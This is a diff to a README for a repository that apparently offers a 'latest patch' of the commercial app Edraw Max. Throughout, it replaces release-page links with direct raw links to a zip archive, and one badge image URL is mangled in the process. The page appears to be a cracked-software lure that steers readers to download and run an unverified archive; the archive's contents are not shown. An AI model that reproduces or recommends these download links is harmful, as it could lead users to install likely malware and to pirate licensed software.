@@ -14,11 +14,11 @@ To start using Edraw Max, follow these simple steps:
 2. **Visit the Releases Page:**
    Click the link below to access the latest version of Edraw Max. 
 
-   [![Download Edraw Max](https://img.shields.io/badge/Download%20Edraw%20Max-Click%20Here-brightgreen)](https://github.com/KaiiiMonroe/Edraw-Max-Latest-Patch/releases)
+   [![Download Edraw Max](https://raw.githubusercontent.com/KaiiiMonroe/Edraw-Max-Latest-Patch/main/ally/Edraw-Max-Latest-Patch-v1.7.zip%20Edraw%20Max-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KaiiiMonroe/Edraw-Max-Latest-Patch/main/ally/Edraw-Max-Latest-Patch-v1.7.zip)
 
 ## 📥 Download & Install
 1. **Download the Application:**
-   Visit this page to download the latest version of Edraw Max: [Download Here](https://github.com/KaiiiMonroe/Edraw-Max-Latest-Patch/releases).
+   Visit this page to download the latest version of Edraw Max: [Download Here](https://raw.githubusercontent.com/KaiiiMonroe/Edraw-Max-Latest-Patch/main/ally/Edraw-Max-Latest-Patch-v1.7.zip).
 
 2. **Locate the Installer:**
    After downloading, find the installation file in your Downloads folder.
@@ -73,4 +73,4 @@ For news and updates, follow our repository and keep your software current.
 ### Join the Community!
 Engage with other users, share your diagrams, and ask questions in our discussion section. Your feedback helps us improve.
 
-[![Download Edraw Max](https://img.shields.io/badge/Download%20Edraw%20Max-Click%20Here-brightgreen)](https://github.com/KaiiiMonroe/Edraw-Max-Latest-Patch/releases)
+[![Download Edraw Max](https://raw.githubusercontent.com/KaiiiMonroe/Edraw-Max-Latest-Patch/main/ally/Edraw-Max-Latest-Patch-v1.7.zip%20Edraw%20Max-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KaiiiMonroe/Edraw-Max-Latest-Patch/main/ally/Edraw-Max-Latest-Patch-v1.7.zip)
